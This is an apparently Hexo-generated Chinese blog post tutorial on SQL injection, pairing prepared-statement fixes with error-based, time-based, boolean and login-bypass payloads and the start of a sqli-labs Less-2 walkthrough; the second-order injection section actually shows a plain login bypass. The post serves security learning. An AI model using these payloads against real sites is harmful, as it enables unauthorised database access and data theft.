@@ -1,0 +1,438 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入 | C3ngH's B10g</title><meta name="author" content="C3ngH"><meta name="copyright" content="C3ngH"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL注入漏洞概念和危害 SQL注入是一种常见的网络安全漏洞，它允许攻击者通过在应用程序的输入中插入恶意的SQL代码来执行恶意操作。这种攻击通常发生在与数据库进行交互的应用程序中，如网站、应用程序或其他与数据库交互的软件。 概念： SQL注入的概念涉及到在应用程序的输入中插入SQL代码，以执行未经授权的数据库操作。这通常发生在应用程序未正确验证、过滤或转义用户提供的输入数据的情况下。 攻击者利用输">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="http://c3ngh.top/2024/01/29/SQLinjection/index.html">
+<meta property="og:site_name" content="C3ngH&#39;s B10g">
+<meta property="og:description" content="SQL注入漏洞概念和危害 SQL注入是一种常见的网络安全漏洞，它允许攻击者通过在应用程序的输入中插入恶意的SQL代码来执行恶意操作。这种攻击通常发生在与数据库进行交互的应用程序中，如网站、应用程序或其他与数据库交互的软件。 概念： SQL注入的概念涉及到在应用程序的输入中插入SQL代码，以执行未经授权的数据库操作。这通常发生在应用程序未正确验证、过滤或转义用户提供的输入数据的情况下。 攻击者利用输">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg">
+<meta property="article:published_time" content="2024-01-29T02:23:52.000Z">
+<meta property="article:modified_time" content="2024-07-14T02:37:49.507Z">
+<meta property="article:author" content="C3ngH">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg"><link rel="shortcut icon" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/favicon.ico"><link rel="canonical" href="http://c3ngh.top/2024/01/29/SQLinjection/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL注入',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-07-14 10:37:49'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/BGimg.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="C3ngH's B10g"><span class="site-name">C3ngH's B10g</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-29T02:23:52.000Z" title="发表于 2024-01-29 10:23:52">2024-01-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-14T02:37:49.507Z" title="更新于 2024-07-14 10:37:49">2024-07-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="SQL注入漏洞概念和危害">SQL注入漏洞概念和危害</h2>
+<p>SQL注入是一种常见的网络安全漏洞，它允许攻击者通过在应用程序的输入中插入恶意的SQL代码来执行恶意操作。这种攻击通常发生在与数据库进行交互的应用程序中，如网站、应用程序或其他与数据库交互的软件。</p>
+<h3 id="概念：">概念：</h3>
+<p>SQL注入的概念涉及到在应用程序的输入中插入SQL代码，以执行未经授权的数据库操作。这通常发生在应用程序未正确验证、过滤或转义用户提供的输入数据的情况下。</p>
+<p>攻击者利用输入验证不足的漏洞，将恶意的SQL代码注入到应用程序的数据库查询中。这使得攻击者能够执行任意的数据库操作，包括读取、修改或删除敏感数据，甚至完全控制数据库。</p>
+<h3 id="危害：">危害：</h3>
+<ol>
+<li><strong>数据泄露：</strong> 攻击者可以利用SQL注入漏洞来访问和泄露敏感数据，如用户凭证、个人信息或其他机密信息。</li>
+<li><strong>数据篡改：</strong> 攻击者可以修改数据库中的数据，包括用户信息、交易记录等。这可能导致信息不一致性、虚假交易或其他损害。</li>
+<li><strong>拒绝服务：</strong> 通过执行破坏性的SQL语句，攻击者可能导致数据库性能下降，甚至完全拒绝服务，使应用程序不可用。</li>
+<li><strong>执行任意命令：</strong> 攻击者可以利用SQL注入漏洞执行任意的数据库命令，这可能包括创建新用户、提升权限或执行其他危险操作。</li>
+<li><strong>应用程序完全控制：</strong> 如果攻击者成功执行足够的恶意SQL代码，他们可能能够完全控制应用程序，甚至服务器。</li>
+</ol>
+<h2 id="SQL注入漏洞的修复建议">SQL注入漏洞的修复建议</h2>
+<h3 id="1-使用prepare语句进行预编译">1.使用prepare语句进行预编译</h3>
+<p>在PHP中，可以使用预编译语句来防范SQL注入攻击。PHP中常用的数据库操作库是PDO（PHP Data Objects）和MySQLi（MySQL Improved）。以下是使用PDO和MySQLi的预编译语句的示例代码：</p>
+<h4 id="1-使用PDO：">(1)使用PDO：</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 使用PDO连接数据库</span></span><br><span class="line"><span class="variable">$dsn</span> = <span class="string">&#x27;mysql:host=localhost;dbname=your_database&#x27;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;your_username&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;your_password&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">setAttribute</span>(PDO::<span class="variable constant_">ATTR_ERRMODE</span>, PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用预编译语句</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username = :username AND password = :password&quot;</span>;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定参数</span></span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:username&#x27;</span>, <span class="variable">$userInputUsername</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:password&#x27;</span>, <span class="variable">$userInputPassword</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行查询</span></span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取结果集</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理结果集</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭连接</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="2-使用MySQLi：">(2)使用MySQLi：</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 使用MySQLi连接数据库</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;your_username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;your_password&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;your_database&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用预编译语句</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定参数</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$userInputUsername</span>, <span class="variable">$userInputPassword</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行查询</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取结果集</span></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">get_result</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理结果集</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭连接</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在上述代码中，使用了<code>prepare</code>方法创建预编译语句，并使用<code>bindParam</code>（PDO）或<code>bind_param</code>（MySQLi）方法将参数绑定到预编译语句中。这样可以防范SQL注入攻击，因为用户输入被正确地参数化处理，而不是直接拼接到SQL查询中。</p>
+<h3 id="2-在Java中使用">2.在Java中使用#{}</h3>
+<ul>
+<li><code>$&#123;&#125;</code> 是用于变量的直接替换，它会将变量的值直接拼接到SQL语句中。这种方式容易受到SQL注入的影响。</li>
+<li><code>#&#123;&#125;</code> 是用于参数的预编译，它会将参数值作为占位符进行处理，从而防范SQL注入。MyBatis在处理 <code>#&#123;&#125;</code> 时会使用预编译语句，确保传入的值不会对SQL语句产生直接的影响。</li>
+</ul>
+<p>因此，对于SQL注入的防范，推荐使用 <code>#&#123;&#125;</code> 的方式，并结合预编译语句，而不是简单地将 <code>$&#123;&#125;</code> 替换为 <code>#&#123;&#125;</code>。</p>
+<h3 id="SQL注释符">SQL注释符</h3>
+<p>SQL注释符用于在SQL语句中添加注释，这样可以使代码更易于理解、维护，同时在某些情况下也可以用于绕过一些限制或进行恶意的SQL注入。以下是一些常见的SQL注释符：</p>
+<ol>
+<li>
+<p><strong>单行注释（–）：</strong></p>
+<ul>
+<li>
+<p>单行注释使用<code>--</code>，后面的内容会被视为注释。</p>
+</li>
+<li>
+<p>示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="comment">-- AND password = &#x27;123&#x27;;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>*<em>多行注释（/* <em>/）：</em></em></p>
+<ul>
+<li>
+<p>多行注释使用<code>/* */</code>，注释部分可以跨越多行。</p>
+</li>
+<li>
+<p>示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="comment">/* AND password = &#x27;123&#x27; */</span>;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>MySQL特有的#号注释：</strong></p>
+<ul>
+<li>
+<p>MySQL支持使用<code>#</code>号作为单行注释，<strong>#的URL编码是%23</strong>。</p>
+</li>
+<li>
+<p>示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> # <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;123&#x27;</span>;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<p>4.<strong>+号在SQL中被编译为空格</strong></p>
+<h3 id="SQL注入漏洞类型">SQL注入漏洞类型</h3>
+<h4 id="1-布尔型：and-1-1或者-and-1-2">1. 布尔型：and 1=1或者 and 1=2</h4>
+<p>假设应用程序使用用户提供的数字值来执行数据库查询：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> product_id <span class="operator">=</span> $userInput;</span><br></pre></td></tr></table></figure>
+<p>攻击者可以尝试输入如下的恶意输入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userInput <span class="operator">=</span> <span class="number">1</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<p>这样构建的查询语句将变为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> product_id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<p>这使得查询条件总是为真，导致返回所有产品的数据。</p>
+<h4 id="2-报错型：">2. 报错型：</h4>
+<p>在字符型SQL注入中主要出现的符号为：<code>' &quot; ) % </code>，我们可以构造相应的字符使语句提前闭合，如果语句成功闭合则会返回语法错误。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tables <span class="keyword">where</span> id <span class="operator">=</span> <span class="operator">%</span>$id<span class="operator">%</span>; </span><br></pre></td></tr></table></figure>
+<p><strong>报错型通用语句</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(database(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"></span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>
+<h4 id="3-时间型：">3.时间型：</h4>
+<p>攻击者利用应用程序在执行SQL查询时的延迟来判断是否存在漏洞，而不直接回显数据。</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or if(length(database())&gt;8,sleep(10),0) and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">-1&#x27; or if(substr(database(),1,1) = “s”,sleep(5),0)</span><br></pre></td></tr></table></figure>
+<h4 id="4-二次注入：">4.二次注入：</h4>
+<p>假设有一个简单的登录页面，用户需要输入用户名和密码来进行身份验证。如果该应用程序存在SQL注入漏洞，攻击者可能通过输入恶意的输入来利用这个漏洞。以下是一个简化的例子：</p>
+<p>原始的SQL查询可能如下所示：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;输入的用户名&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;输入的密码&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>在正常情况下，用户输入的用户名和密码将被直接插入到SQL查询中。但是，如果应用程序没有正确验证和过滤输入，攻击者可能输入以下内容：</p>
+<p>用户名：<code>' OR '1'='1' --</code><br>
+密码：<code>任意密码</code></p>
+<p>这将导致构建的SQL查询变为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="comment">--&#x27; AND password = &#x27;任意密码&#x27;;</span></span><br></pre></td></tr></table></figure>
+<p>在这个例子中，<code>--</code> 表示SQL注释，它使得原始查询中剩余的部分被忽略。由于 <code>'1'='1'</code> 总是为真，整个查询的条件将始终为真，因此系统将返回所有用户的数据，而不仅仅是具有输入的用户名和密码的用户。</p>
+<h3 id="SQL注入利用">SQL注入利用</h3>
+<h4 id="1-手工注入">1.手工注入</h4>
+<p>1.<strong>识别目标：</strong></p>
+<ul>
+<li>确定目标网站或应用程序存在潜在的SQL注入漏洞。这通常包括在用户输入处检查是否存在不安全的数据处理。</li>
+</ul>
+<p>环境使用phpstudy+sqli-labs搭建，以Less-2为例</p>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129143216696.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129143216696.png" alt="img"></a></p>
+<p>数据库名：security，在Navicat中可以看到该数据库的组织形式</p>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129142858582.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129142858582.png" alt="img"></a></p>
+<p>2.<strong>找到注入点：</strong></p>
+<ul>
+<li>确定可以注入SQL代码的具体输入点，通常是在应用程序的URL参数、表单字段、Cookie或HTTP标头中。</li>
+</ul>
+<p>在本题中，题目给出<strong>Please input the ID as parameter with numeric value</strong></p>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129143900449.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129143900449.png" alt="image-20240129143900449"></a></p>
+<p>经过测试由id变量来控制输入不同的数据</p>
+<p>3.<strong>测试注入点：</strong></p>
+<ul>
+<li>在注入点插入一些简单的SQL语句，例如 <code>1' OR '1'='1</code>，看看是否能够改变查询的行为或获取额外的信息。</li>
+</ul>
+<p>例如本题：</p>
+<p>(1)构造<code>?id=-1 or 1=1</code>使得条件恒为正确，结果显示正常，确定id变量为注入点</p>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129145323028.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129145323028.png" alt="image-20240129145323028"></a></p>
+<p>(2)构造<code>?id=-1 or 1=1 order by 4</code>确定columns只有3列</p>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129145704504.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129145704504.png" alt="image-20240129145704504"></a></p>
+<p>如果order by 后的数字小于等于有效列则会正常显示，如果大于有效列则会报错</p>
